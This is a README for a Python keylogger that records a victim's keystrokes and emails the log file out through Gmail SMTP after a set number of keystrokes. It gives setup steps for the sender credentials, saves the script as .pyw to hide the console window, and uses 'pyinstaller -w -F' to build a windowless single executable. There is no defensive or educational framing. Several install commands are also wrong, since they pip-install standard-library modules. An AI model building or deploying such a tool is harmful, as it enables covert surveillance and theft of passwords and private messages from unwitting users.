# Keylogger
A simple Python Key-logger that sends the log file through email after specified number of keystrokes

## Requirements
1.  pynput
2.  logging
3.  smtplib
4.  time
5.  email

## Installation

```bash
pip install pynput
pip install logging
pip install smtplib
pip install time
pip install email
```

## Usage
The sciprt is written in python and saved in pyw form. 
```
PYW files are used in Windows to indicate a script needs to be run using PYTHONW.EXE instead of PYTHON.EXE
in order to prevent a DOS console from popping up to display the output.
This patch makes it possible to import such scripts, in case they're also usable as modules.
```
Replace the following feilds for the email function to work 
```
email_user = 'from'
email_password = 'less_secure password'//You need to create a less secure password for apps using google 
email_send = 'receiver_email'
```
##EXE file creation##
To create a .exe file you need to use the pyinstaller module 
```pip install pyinstaller
```
To use pyinstaller
```pyinstaller -w -F key.pyw```
